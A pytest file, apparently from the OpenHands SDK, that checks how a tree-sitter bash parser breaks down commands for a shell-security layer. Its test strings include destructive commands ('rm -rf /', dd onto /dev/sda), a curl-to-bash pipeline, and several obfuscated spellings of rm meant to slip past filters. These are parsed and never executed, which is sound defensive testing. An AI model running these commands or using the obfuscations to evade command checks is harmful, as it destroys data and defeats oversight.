"""Pin tree-sitter-bash node shapes needed by shell-security migration."""

from __future__ import annotations

from collections.abc import Iterator
from dataclasses import dataclass

import pytest
from tree_sitter import Node

from openhands.sdk.security.shell_parser import parse


type ExpectedChild = tuple[str, str]


@dataclass(frozen=True)
class ExpectedNode:
    node_type: str
    text: str
    named_children: tuple[ExpectedChild, ...] | None = None


@dataclass(frozen=True)
class NodeShapeCase:
    case_id: str
    command: str
    has_error: bool
    root_named_children: tuple[str, ...]
    expected_nodes: tuple[ExpectedNode, ...]
    clean_but_opaque: bool = False


NODE_SHAPE_CASES: tuple[NodeShapeCase, ...] = (
    NodeShapeCase(
        case_id="simple_command",
        command="echo hello",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command",
                "echo hello",
                (("command_name", "echo"), ("word", "hello")),
            ),
            ExpectedNode("command_name", "echo", (("word", "echo"),)),
        ),
    ),
    NodeShapeCase(
        case_id="pipeline",
        command="echo hi | wc -c",
        has_error=False,
        root_named_children=("pipeline",),
        expected_nodes=(
            ExpectedNode(
                "pipeline",
                "echo hi | wc -c",
                (("command", "echo hi"), ("command", "wc -c")),
            ),
            ExpectedNode(
                "command",
                "echo hi",
                (("command_name", "echo"), ("word", "hi")),
            ),
            ExpectedNode(
                "command",
                "wc -c",
                (("command_name", "wc"), ("word", "-c")),
            ),
        ),
    ),
    NodeShapeCase(
        case_id="redirect",
        command="echo hi > /tmp/out",
        has_error=False,
        root_named_children=("redirected_statement",),
        expected_nodes=(
            ExpectedNode(
                "redirected_statement",
                "echo hi > /tmp/out",
                (("command", "echo hi"), ("file_redirect", "> /tmp/out")),
            ),
            ExpectedNode("file_redirect", "> /tmp/out", (("word", "/tmp/out"),)),
        ),
    ),
    NodeShapeCase(
        case_id="variable_assignment",
        command="FOO=bar echo $FOO",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command",
                "FOO=bar echo $FOO",
                (
                    ("variable_assignment", "FOO=bar"),
                    ("command_name", "echo"),
                    ("simple_expansion", "$FOO"),
                ),
            ),
            ExpectedNode(
                "variable_assignment",
                "FOO=bar",
                (("variable_name", "FOO"), ("word", "bar")),
            ),
        ),
    ),
    NodeShapeCase(
        case_id="rm_rf",
        command="rm -rf /",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command",
                "rm -rf /",
                (("command_name", "rm"), ("word", "-rf"), ("word", "/")),
            ),
        ),
    ),
    NodeShapeCase(
        case_id="path_qualified_rm",
        command="/bin/rm -rf /",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command",
                "/bin/rm -rf /",
                (("command_name", "/bin/rm"), ("word", "-rf"), ("word", "/")),
            ),
        ),
    ),
    NodeShapeCase(
        case_id="post_argument_rm_flag",
        command="rm / -rf",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command",
                "rm / -rf",
                (("command_name", "rm"), ("word", "/"), ("word", "-rf")),
            ),
        ),
    ),
    NodeShapeCase(
        case_id="dd_device_output",
        command="dd if=/tmp/in of=/dev/sda",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command",
                "dd if=/tmp/in of=/dev/sda",
                (
                    ("command_name", "dd"),
                    ("word", "if=/tmp/in"),
                    ("word", "of=/dev/sda"),
                ),
            ),
        ),
    ),
    NodeShapeCase(
        case_id="fetch_to_shell_pipeline",
        command="curl https://x | bash",
        has_error=False,
        root_named_children=("pipeline",),
        expected_nodes=(
            ExpectedNode(
                "pipeline",
                "curl https://x | bash",
                (("command", "curl https://x"), ("command", "bash")),
            ),
        ),
    ),
    NodeShapeCase(
        case_id="escaped_pipe_is_word",
        command=r"curl x\|bash",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command",
                r"curl x\|bash",
                (("command_name", "curl"), ("word", r"x\|bash")),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="quoted_command_name_concatenation",
        command='r"m" -rf /',
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command_name",
                'r"m"',
                (("concatenation", 'r"m"'),),
            ),
            ExpectedNode(
                "concatenation",
                'r"m"',
                (("word", "r"), ("string", '"m"')),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="empty_single_quoted_command_name_concatenation",
        command="r''m -rf /",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command_name",
                "r''m",
                (("concatenation", "r''m"),),
            ),
            ExpectedNode(
                "concatenation",
                "r''m",
                (("word", "r"), ("raw_string", "''"), ("word", "m")),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="fully_quoted_command_name",
        command="'rm' -rf /",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command_name",
                "'rm'",
                (("raw_string", "'rm'"),),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="command_substitution_command_name",
        command="$(echo rm) -rf /",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command_name",
                "$(echo rm)",
                (("command_substitution", "$(echo rm)"),),
            ),
            ExpectedNode(
                "command_substitution",
                "$(echo rm)",
                (("command", "echo rm"),),
            ),
            ExpectedNode(
                "command",
                "echo rm",
                (("command_name", "echo"), ("word", "rm")),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="backtick_command_substitution_command_name",
        command="`echo rm` -rf /",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command_name",
                "`echo rm`",
                (("command_substitution", "`echo rm`"),),
            ),
            ExpectedNode(
                "command_substitution",
                "`echo rm`",
                (("command", "echo rm"),),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="ansi_c_command_name",
        command=r"$'\x72m' -rf /",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command_name",
                r"$'\x72m'",
                (("ansi_c_string", r"$'\x72m'"),),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="ansi_c_octal_command_name",
        command=r"$'\162\155' -rf /",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command_name",
                r"$'\162\155'",
                (("ansi_c_string", r"$'\162\155'"),),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="bash_c_raw_string_payload",
        command="bash -c 'rm -rf /'",
        has_error=False,
        root_named_children=("command",),
        expected_nodes=(
            ExpectedNode(
                "command",
                "bash -c 'rm -rf /'",
                (
                    ("command_name", "bash"),
                    ("word", "-c"),
                    ("raw_string", "'rm -rf /'"),
                ),
            ),
        ),
        clean_but_opaque=True,
    ),
    NodeShapeCase(
        case_id="malformed_unclosed_quote",
        command='echo "unterminated',
        has_error=True,
        root_named_children=("command", "ERROR"),
        expected_nodes=(
            ExpectedNode("command", "echo", (("command_name", "echo"),)),
            ExpectedNode(
                "ERROR", '"unterminated', (("string_content", "unterminated"),)
            ),
        ),
    ),
)


def _node_text(node: Node, source: bytes) -> str:
    return source[node.start_byte : node.end_byte].decode()


def _named_child_shapes(node: Node, source: bytes) -> tuple[ExpectedChild, ...]:
    return tuple(
        (child.type, _node_text(child, source)) for child in node.named_children
    )


def _iter_named_nodes(node: Node) -> Iterator[Node]:
    if node.is_named:
        yield node
    for child in node.children:
        yield from _iter_named_nodes(child)


def _find_expected_node(root: Node, source: bytes, expected: ExpectedNode) -> Node:
    for node in _iter_named_nodes(root):
        if (
            node.type == expected.node_type
            and _node_text(node, source) == expected.text
        ):
            return node
    pytest.fail(f"missing {expected.node_type!r} node spanning {expected.text!r}")


@pytest.mark.parametrize(
    "case",
    NODE_SHAPE_CASES,
    ids=[case.case_id for case in NODE_SHAPE_CASES],
)
def test_shell_parser_node_shapes(case: NodeShapeCase) -> None:
    source = case.command.encode()
    result = parse(case.command)
    root = result.tree.root_node

    assert result.has_error is case.has_error
    assert root.type == "program"
    assert root.start_byte == 0
    assert root.end_byte == len(source)
    assert (
        tuple(child.type for child in root.named_children) == case.root_named_children
    )

    for expected in case.expected_nodes:
        node = _find_expected_node(root, source, expected)
        if expected.named_children is not None:
            assert _named_child_shapes(node, source) == expected.named_children


@pytest.mark.parametrize(
    "case",
    [case for case in NODE_SHAPE_CASES if case.clean_but_opaque],
    ids=[case.case_id for case in NODE_SHAPE_CASES if case.clean_but_opaque],
)
def test_clean_but_opaque_commands_are_parse_successes(case: NodeShapeCase) -> None:
    assert parse(case.command).has_error is False
